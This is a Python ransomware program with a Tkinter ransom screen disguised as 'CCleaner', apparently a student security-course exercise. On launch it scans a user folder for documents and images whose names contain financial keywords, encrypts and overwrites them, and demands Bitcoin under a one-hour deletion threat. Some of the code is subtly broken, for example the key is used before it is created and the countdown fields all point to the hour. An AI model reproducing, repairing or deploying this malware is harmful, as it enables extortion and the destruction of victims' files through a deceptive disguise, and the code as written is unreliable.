from ast import Lambda
import os
import string
from tkinter import *
from tkinter import messagebox
from PIL import ImageTk, Image
import time
from cryptography.fernet import Fernet
import random

# safeguard = input("Please enter the safeguard password:")
# if safeguard != 'start':
#     quit()

#creates list of files of certain extensions within given folder
def generate_file_list_keyword(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
    file_paths = []
    rfile = open('MoneyWords.txt', 'r')
    words = [line[:-1] for line in rfile]
    for root, dirs, files, in os.walk(path):
        for file in files:
            for w in words:
                file_name,file_ext = os.path.splitext(root+'\\'+file)
                if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
                        file_paths.append(root+'\\'+file)
    print(file_paths)
    return file_paths

def generate_file_list(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
    file_paths = []
    for root, dirs, files, in os.walk(path):
        for file in files:
            file_name,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
    print(file_paths)
    return file_paths

#Creates fernet key
def create_key():
    return Fernet(key)

#Writes fernet key to text file on the desktop
def write_key(key):
    if bitcoin_entry.get() == how_many_bitcoins_do_we_want:
        with open(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt', 'wb') as filekey:
            filekey.write(key)
        messagebox.showinfo(title = 'Text File Created', message = "A text file has been created with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")

#reads and returns key stored in filekey.txt
def read_key():
    try:
        with open('filekey.txt', 'rb') as filekey:
            key = filekey.read()

        fernet = Fernet(key)
        return fernet
    except:
        print("The key does not exist")


#uses fernet key to encrypt all files in file_paths list
def encrypt_files(file_paths, fernet):
    for f in file_paths:
        #create encrypted version of the file
        with open(f, 'rb') as file:
            data = file.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        
        #overwrite the original with the new encrypted version
        os.remove(f)
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

#uses fernet key to decrypt all files in file_paths list
def decrypt_files(file_paths, fernet):
    if key_entry.get() == key:
        for f in file_paths:
            #create decrypted version of the file
            with open(f, 'rb') as enc_file:
                decrypted = fernet.decrypt(enc_file.read())
        
            #overwrite the original with the new decrypted version
            with open(f, 'wb') as dec_file:
                dec_file.write(decrypted)

#returns whether a keyword was found in a file (only tested with .txt)
# def keyword_check(keyword, f):
#     file = open(f, 'r').read()
#     for word in file.split():       
#         word = word.translate(str.maketrans('', '', string.punctuation))
#         if word.lower() == keyword:
#             return True
#     return False

# #returns whether a file is encrypted or not
# def isEncrypted(f):
#     #probably not the best of way of doing this, only tested with txt files
#     #would also let an unencrypted file that starts with gAAA for whatever reason accidentally return true
#     file = open(f, 'r').read()
#     return file[0:4] == "gAAA"


# #sequence to generate a new key and encrypt files with it
# def encrypt(file_paths, key):
#     for f in file_paths:
#         print(f)

#     encrypt_files(file_paths, key)

#sequence to generate a new key and encrypt files that contain a specific keyword
# def encrypt_keyword(file_paths, keyword):
#     write_key()
#     fernet = read_key()

#     target_file_paths = []

#     for f in file_paths:
#         if (keyword_check(keyword, f)):
#             target_file_paths.append(f)
#             print(f)

#     encrypt_files(target_file_paths, fernet)

# #sequence to decrypt the already encrypted files using the key that already exists
# def decrypt(file_paths):
#     fernet = read_key()
#     if (fernet != None):
#         target_file_paths = []

#         for f in file_paths:
#             if (isEncrypted(f)):
#                 target_file_paths.append(f)
#                 print(f)

#         if (len(target_file_paths) == 0):
#             print("No files were encrypted")
#         else:
#             decrypt_files(target_file_paths, fernet)

#def main():
    #will need to get current working directory or something later
    # file_paths = generate_file_list('C:\\Users\\ericw\\Documents\\CECS378Test')
    
    #encrypt_files(file_paths, key)
    # write_key()
    # encrypt_keyword(file_paths, "a")
    # decrypt(file_paths)

# GUI stuff ==========================================================================================================================================================

root = Tk()
root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
root.iconbitmap('ccleaner.ico')
root.geometry("1280x720")
root.configure(bg = 'red')
how_many_bitcoins_do_we_want = str(random.randint(1,20))

file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Documents\\CECS378Test')
key = create_key()
encrypt_files(file_paths, key)

hour = StringVar()
minute = StringVar()
second = StringVar()

hour.set('01')
minute.set('00')
second.set('00')

hour_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)
minute_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)
second_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)

hour_Text_Box.place(x = 500, y = 310)
minute_Text_Box.place(x = 600, y = 310)
second_Text_Box.place(x = 700, y = 310)

# def runTimer():
#     try:
#         clockTime = int(hour.get() * 3600) + int(minute.get() * 60) + int(second.get())
#     except:
#         print('Incorrect values')

#     while(clockTime > -1):
#         total_Minutes, total_Seconds = divmod(clockTime, 60)

#         total_Hours = 0
#         if total_Minutes > 60:
#             total_Hours, total_Minutes = divmod(total_Minutes, 60)
        
#         hour.set('{0:2d}'.format(total_Hours))
#         minute.set('{0:2d}'.format(total_Minutes))
#         second.set('{0:2d}'.format(total_Seconds))

#         #root.update()
#         #time.sleep(1)

#         if clockTime == 0:
#             messagebox.showinfo('', 'Your time is up. Your files will now be deleted. Have a nice day!')
        
#         clockTime -= 1

skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
image_label1 = Label(image = skull_image, bg = 'red')
image_label2 = Label(image = skull_image, bg = 'red')
image_label3 = Label(image = skull_image, bg = 'red')
image_label4 = Label(image = skull_image, bg = 'red')

image_label1.place(x = 0, y = 0)
image_label2.place(x = 1051, y = 0)
image_label3.place(x = 0, y = 500)
image_label4.place(x = 1051, y = 500)


main_text = Label(root, text="Your important financial files have just been encrypted.\nSend " +how_many_bitcoins_do_we_want + " BitCoin to us, or your files will be deleted and lost forever.\nYou have one hour.", font = ('Times New Roman', 24), fg = 'white', bg = 'red')
main_text.place(x = 217, y = 200)

bitcoin_entry = Entry(root, width = 30, borderwidth = 5)
bitcoin_entry.place(x = 465, y = 428)
bitcoin_entry.insert(0, "Enter Amount of Bitcoin to Send")

bitcoin_button = Button(root, text = "Send\nBitCoin", width = 10, height = 2, borderwidth = 5, font = ('Times New Roman', 15), command=lambda:write_key(key))
bitcoin_button.place(x = 685, y = 410)

key_entry = Entry(root, width = 50, borderwidth = 5)
key_entry.place(x = 481, y = 500)
key_entry.insert(0, "Enter Key Here")

key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18), command = lambda: decrypt_files(file_paths, key))
key_button.place(x = 546, y = 540)

#runTimer()

# =================================================================================================================================================================

# Also GUI
root.mainloop()